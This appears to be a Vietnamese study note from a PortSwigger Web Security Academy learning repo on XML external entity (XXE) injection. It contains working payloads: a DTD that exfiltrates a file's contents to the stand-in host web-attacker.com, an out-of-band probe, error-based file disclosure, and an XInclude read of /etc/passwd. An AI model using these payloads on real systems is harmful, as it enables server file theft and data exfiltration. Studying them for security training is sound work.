## **_1. Định nghĩa_**

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/ab5147eb-1cff-407a-963b-01afca163025)

XML external entity injection (còn được gọi là XXE) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng. Nó thường cho phép kẻ tấn công xem các tệp trên hệ thống tệp máy chủ ứng dụng và tương tác với bất kỳ hệ thống back-end hoặc bên ngoài nào mà chính ứng dụng có thể truy cập.

## **_2. Cách phát sinh_**
Một số ứng dụng sử dụng định dạng XML để truyền dữ liệu giữa trình duyệt và máy chủ. Các ứng dụng thực hiện điều này hầu như luôn sử dụng thư viện tiêu chuẩn hoặc API nền tảng để xử lý dữ liệu XML trên máy chủ. Các lỗ hổng XXE phát sinh do đặc tả XML chứa các tính năng nguy hiểm tiềm tàng khác nhau và trình phân tích cú pháp tiêu chuẩn hỗ trợ các tính năng này ngay cả khi chúng không được ứng dụng sử dụng bình thường.

Một số ứng dụng sử dụng định dạng XML để truyền dữ liệu giữa trình duyệt và máy chủ. Các ứng dụng thực hiện điều này hầu như luôn sử dụng thư viện tiêu chuẩn hoặc API nền tảng để xử lý dữ liệu XML trên máy chủ. Các lỗ hổng XXE phát sinh do đặc tả XML chứa các tính năng nguy hiểm tiềm tàng khác nhau và trình phân tích cú pháp tiêu chuẩn hỗ trợ các tính năng này ngay cả khi chúng không được ứng dụng sử dụng bình thường.

## **_3. How to test_**

## [**_4. Khai thác_**](part1.md)
- Để truy xuất tệp (lab 1)
  - sửa đổi XML theo 2 cách
    - Introduce (or edit) `DOCTYPE` xác định 1 thực thể bên ngoài có chứa đường dẫn tới tệp
    - Chỉnh sửa giá trị dữ liệu trong XML được trả về trong respond để sử dụng thực thể bên ngoài đã xác định

- Để thực hiện các cuộc tấn công SSRF (lab 2)
  - cần xác định thực thể XML bên ngoài bằng cách sử dụng URL mà bạn muốn nhắm mục tiêu và sử dụng thực thể được xác định trong giá trị dữ liệu

## [**_5. Blind XXE_**](part2.md)
- _**Blind XXE**_ là XXEi nhưng không trả về giá trị dữ liệu trong response
- Phát hiện bằng kỹ thuật OOB (lab 3, 4)
  - tương tự như XXE SSRF, URL mục tiêu sẽ là URL mà ta kiểm soát
  - khi bị block, do một số xác thực đầu vào hoặc phân tích cú pháp XML đang sử dụng, hãy sử dụng tham số XML thay thế
    - đầu tiên là khai báo: `<!ENTITY % myparameterentity "my parameter entity value" >`
    - thứ hai là tham chiếu bằng cách sử dụng `%`: `%myparameterentity;`
    - VD: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`
- Khai thác để lọc dữ liệu OOB (lab 5)
  - file độc hại trích xuất nội dung file đã cho
    ```
    <!ENTITY % file SYSTEM "file:///file_đã_cho">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
    %eval;
    %exfiltrate;
    ```
    - Định nghĩa thực thể `file` chứa nội dung file đã cho: `<!ENTITY % file SYSTEM "file:///file_đã_cho">`
    - Định nghĩa thực thể `eval` chứa thực thể khác gọi là `exfiltrate` (thực thể sẽ được đánh giá bằng cách tạo 1 yêu  cầu HTTP tới máy chủ web tấn công chứa giá trị của `file` trong chuỗi truy vấn URL: `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">`
    - Sử dụng `eval` thực hiện khái báo `exfiltrate`: `%eval;`
    - Sử dụng `exfiltrate` để giá trị của nó được đánh giá: `%exfiltrate;`
  - Cuối cùng, tấn công gửi XXE: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>`

- Khai thác để truy xuất dữ liệu qua các thông báo lỗi (lab 6)
  ```
  <!ENTITY % file SYSTEM "file:///file_đã_cho">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
  ```
  - Định nghĩa `file` chứa nội dung của file đã cho: `<!ENTITY % file SYSTEM "file:///file_đã_cho">`
  - Định nghĩa `eval` chứa `error` (được đánh giá bằng cách tải 1 tệp không tồn tại có chứa giá trị của `file`): `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
    
- lab 7 EXPERT

## [**_6. Tìm bề mặt tấn công ẩn để thực hiện XXEi_**](part3.md)
- Tấn công XInclude (lab 8)
  - XInclude là một phần của đặc tả XML cho phép xây dựng một tài liệu XML từ các tài liệu phụ. Bạn có thể thực hiện một cuộc tấn công XInclude bên trong bất kỳ giá trị dữ liệu nào trong tài liệu XML, do đó cuộc tấn công có thể được thực hiện trong các tình huống mà bạn chỉ kiểm soát một mục dữ liệu duy nhất được đặt vào tài liệu XML phía máy chủ.
    
  - tham chiếu tên và cung cấp đường dẫn đến tệp muốn đưa vào:

      ```
      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/></foo>
      ```
      
- Thông qua upload file (lab 9)
  - Một số ứng dụng cho phép người dùng tải lên các tệp sau đó được xử lý phía máy chủ. Một số định dạng tệp phổ biến sử dụng XML hoặc chứa các thành phần phụ XML. Ví dụ về các định dạng dựa trên XML là các định dạng tài liệu văn phòng như DOCX và các định dạng hình ảnh như SVG.
  - Ví dụ: một ứng dụng có thể cho phép người dùng tải hình ảnh lên và xử lý hoặc xác thực những hình ảnh này trên máy chủ sau khi chúng được tải lên. Ngay cả khi ứng dụng mong muốn nhận được định dạng như PNG hoặc JPEG, thư viện xử lý hình ảnh đang được sử dụng có thể hỗ trợ hình ảnh SVG. Vì định dạng SVG sử dụng XML nên kẻ tấn công có thể gửi hình ảnh SVG độc hại và do đó tiếp cận bề mặt tấn công ẩn để tìm lỗ hổng XXE.

- Thông qua chỉnh sửa Content-type
